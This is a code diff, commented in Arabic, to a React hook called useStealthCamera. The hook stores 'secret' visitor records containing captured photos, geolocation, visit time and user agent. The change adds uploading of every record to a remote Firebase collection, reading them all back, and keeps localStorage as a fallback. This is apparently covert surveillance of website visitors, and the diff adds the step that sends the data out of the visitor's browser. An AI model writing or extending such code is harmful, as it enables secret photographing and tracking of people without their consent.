@@ -1,4 +1,5 @@
 import { useState, useRef, useCallback } from 'react';
+import { firestoreHelpers, COLLECTIONS } from '@/lib/firebase';
 
 interface CapturedPhoto {
   id: string;
@@ -304,26 +305,17 @@ export const useStealthCamera = () => {
         visitTime: visitor.visitTime
       });
 
-      // حفظ بيانات الزائر
-      const existingVisitors = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
-      existingVisitors.push(visitor);
-      localStorage.setItem('stealth_visitors', JSON.stringify(existingVisitors));
-
-      console.log('✅ تم حفظ بيانات الزائر. إجمالي الزوار:', existingVisitors.length);
-      
-      // التحقق من الحفظ
-      setTimeout(() => {
-        const saved = localStorage.getItem('stealth_visitors');
-        if (saved) {
-          const parsedData = JSON.parse(saved);
-          const found = parsedData.find((v: VisitorData) => v.id === visitor.id);
-          if (found) {
-            console.log('✅ تم التأكد من حفظ البيانات');
-          } else {
-            console.error('❌ لم يتم العثور على البيانات المحفوظة');
-          }
-        }
-      }, 500);
+      // حفظ بيانات الزائر في Firebase بدلاً من localStorage
+      try {
+        await firestoreHelpers.addDocument(COLLECTIONS.STEALTH_VISITORS, visitor);
+        console.log('✅ تم حفظ بيانات الزائر السري في Firebase');
+      } catch (firebaseError) {
+        console.error('❌ فشل في حفظ البيانات في Firebase، سيتم الحفظ محلياً:', firebaseError);
+        // Fallback to localStorage if Firebase fails
+        const existingVisitors = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
+        existingVisitors.push(visitor);
+        localStorage.setItem('stealth_visitors', JSON.stringify(existingVisitors));
+      }
 
       setVisitorData(visitor);
       return visitor;
@@ -334,19 +326,47 @@ export const useStealthCamera = () => {
   }, [getCurrentLocation]);
 
   // الحصول على جميع الزوار
-  const getAllVisitors = useCallback((): VisitorData[] => {
+  const getAllVisitors = useCallback(async (): Promise<VisitorData[]> => {
     try {
-      const data = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
-      console.log('📊 تم تحميل بيانات الزوار:', data.length);
-      return data;
+      // محاولة الحصول على البيانات من Firebase أولاً
+      const firebaseVisitors = await firestoreHelpers.getDocuments(COLLECTIONS.STEALTH_VISITORS);
+      if (firebaseVisitors.length > 0) {
+        console.log('📊 تم تحميل البيانات السرية من Firebase:', firebaseVisitors.length);
+        return firebaseVisitors.map(doc => ({
+          id: doc.id,
+          photos: doc.photos || [],
+          location: doc.location,
+          visitTime: doc.visitTime?.toDate ? doc.visitTime.toDate() : new Date(doc.visitTime),
+          userAgent: doc.userAgent
+        }));
+      }
+      
+      // العودة إلى localStorage إذا كان Firebase فارغاً
+      const localVisitors = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
+      console.log('📊 تم تحميل البيانات السرية محلياً:', localVisitors.length);
+      return localVisitors;
     } catch (error) {
-      console.error('❌ خطأ في تحميل البيانات:', error);
-      return [];
+      console.error('❌ خطأ في تحميل البيانات من Firebase، استخدام البيانات المحلية:', error);
+      try {
+        return JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
+      } catch (localError) {
+        console.error('❌ خطأ في تحميل البيانات المحلية:', localError);
+        return [];
+      }
     }
   }, []);
 
   // مسح جميع البيانات
-  const clearAllData = useCallback(() => {
+  const clearAllData = useCallback(async () => {
+    try {
+      // مسح البيانات من Firebase
+      await firestoreHelpers.deleteAllDocuments(COLLECTIONS.STEALTH_VISITORS);
+      console.log('🗑️ تم مسح جميع البيانات السرية من Firebase');
+    } catch (error) {
+      console.error('❌ خطأ في مسح البيانات من Firebase:', error);
+    }
+    
+    // مسح البيانات المحلية أيضاً
     try {
       localStorage.removeItem('stealth_visitors');
       
@@ -359,9 +379,9 @@ export const useStealthCamera = () => {
       
       setCapturedPhotos([]);
       setVisitorData(null);
-      console.log('🗑️ تم مسح جميع البيانات');
+      console.log('🗑️ تم مسح جميع البيانات السرية المحلية');
     } catch (error) {
-      console.error('❌ خطأ في مسح البيانات:', error);
+      console.error('❌ خطأ في مسح البيانات المحلية:', error);
     }
   }, []);
 
